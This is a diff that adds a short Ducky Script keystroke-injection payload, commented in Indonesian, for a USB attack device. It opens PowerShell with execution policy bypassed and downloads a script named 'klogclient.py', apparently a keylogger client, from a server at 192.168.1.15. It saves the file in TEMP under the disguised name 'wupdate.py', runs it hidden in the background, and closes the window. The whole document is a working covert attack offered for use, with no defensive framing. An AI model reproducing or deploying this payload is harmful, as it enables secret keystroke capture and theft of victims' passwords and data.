@@ -1,0 +1,19 @@
+REM Ducky Script v3.2 - Metode Download dengan ExecutionPolicy Bypass
+DELAY 2000
+
+REM Buka PowerShell secara tersembunyi dengan mengabaikan execution policy
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -ExecutionPolicy Bypass
+ENTER
+DELAY 1500
+
+REM Unduh skrip dari server Pi, simpan ke TEMP, lalu langsung jalankan di background
+REM 'iwr' adalah alias untuk Invoke-WebRequest
+STRING iwr http://192.168.1.15:8000/klogclient.py -OutFile $env:TEMP\wupdate.py; Start-Process pythonw -ArgumentList "$env:TEMP\wupdate.py" -WindowStyle Hidden
+ENTER
+DELAY 500
+
+REM Tutup jendela PowerShell
+STRING exit
+ENTER
